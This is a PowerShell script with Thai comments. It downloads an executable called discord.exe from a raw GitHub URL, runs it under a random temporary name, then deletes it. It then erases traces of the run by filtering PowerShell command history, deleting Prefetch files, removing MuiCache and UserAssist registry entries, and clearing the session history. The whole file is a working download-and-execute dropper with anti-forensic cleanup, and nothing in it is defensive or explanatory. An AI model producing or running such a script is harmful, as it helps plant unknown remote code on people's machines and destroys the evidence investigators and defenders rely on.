# ===== CONFIG =====
$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"

# ===== DISABLE CURRENT SESSION HISTORY =====
try {
    Remove-Module PSReadLine -ErrorAction SilentlyContinue
} catch {}

# ===== GENERATE RANDOM FILE NAME (หลีกเลี่ยงคำว่า discord/cmd) =====
# สุ่มชื่อไฟล์เป็นตัวอักษรภาษาอังกฤษ 8 ตัว เช่น tXgFqWsa.exe
$randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
$tempExe = Join-Path $env:TEMP "$randomName.exe"

# ===== DOWNLOAD =====
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

# ===== CHECK =====
if (Test-Path $tempExe) {
    Write-Host "Downloaded"

    # ===== RUN =====
    $proc = Start-Process $tempExe -PassThru

    # ===== WAIT PROCESS CLOSE =====
    $proc.WaitForExit()

    # ===== WAIT EXTRA =====
    Start-Sleep -Seconds 2

    # ===== DELETE WITH RETRY =====
    $maxTry = 5
    for ($i = 1; $i -le $maxTry; $i++) {
        try {
            if (Test-Path $tempExe) {
                Remove-Item $tempExe -Force -ErrorAction Stop
                Write-Host "Deleted"
                break
            }
        } catch {
            Write-Host "Retry delete $i"
            Start-Sleep -Seconds 2
        }
    }

    # =========================================================
    #  SYSTEM DEEP CLEANER (ล้างประวัติคำว่า discord / cmd / ชื่อสุ่ม)
    # =========================================================
    
    # 1. ล้างประวัติพิมพ์คำสั่งของ PowerShell (ConsoleHost_history.txt)
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        try {
            # ดึงประวัติเดิมมา กรองเอาบรรทัดที่มีคำว่า discord, cmd หรือชื่อสุ่มออกให้หมด
            (Get-Content $historyPath) | Where-Object { 
                $_ -notmatch "discord" -and 
                $_ -notmatch "cmd" -and 
                $_ -notmatch $randomName 
            } | Set-Content $historyPath
        } catch {}
    }

    # 2. ลบไฟล์แคชใน Prefetch (ถ้าสคริปต์ถูกรันด้วยสิทธิ์ Administrator จะลบส่วนนี้ได้สมบูรณ์)
    try {
        Get-ChildItem "C:\Windows\Prefetch" -Filter "*$randomName*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem "C:\Windows\Prefetch" -Filter "*discord*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    } catch {}

    # 3. เคลียร์ Registry MuiCache (ลบประวัติการจำแอปของ Windows)
    try {
        $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
        Get-ItemProperty $muiPath -ErrorAction SilentlyContinue | 
            Get-Member -MemberType NoteProperty | 
            Where-Object { $_.Name -like "*$randomName*" -or $_.Name -like "*discord*" } | 
            ForEach-Object { Remove-ItemProperty $muiPath -Name $_.Name -ErrorAction SilentlyContinue }
    } catch {}

    # 4. เคลียร์ Registry UserAssist (ลบประวัติการเปิดโปรแกรมล่าสุด)
    try {
        $uaPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        if (Test-Path $uaPath) {
            Get-ChildItem $uaPath | ForEach-Object {
                $subKey = $_.Name -replace "HKEY_CURRENT_USER", "HKCU:"
                Get-ItemProperty "$subKey\Count" -ErrorAction SilentlyContinue | 
                    Get-Member -MemberType NoteProperty | 
                    Where-Object { $_.Name -like "*$randomName*" -or $_.Name -like "*discord*" } | 
                    ForEach-Object { Remove-ItemProperty "$subKey\Count" -Name $_.Name -ErrorAction SilentlyContinue }
            }
        }
    } catch {}

    # 5. ล้างประวัติในแอปพลิเคชันพื้นฐาน
    Clear-History
    Write-Host "Finished"
}
else {
    Write-Host "Download failed"
}
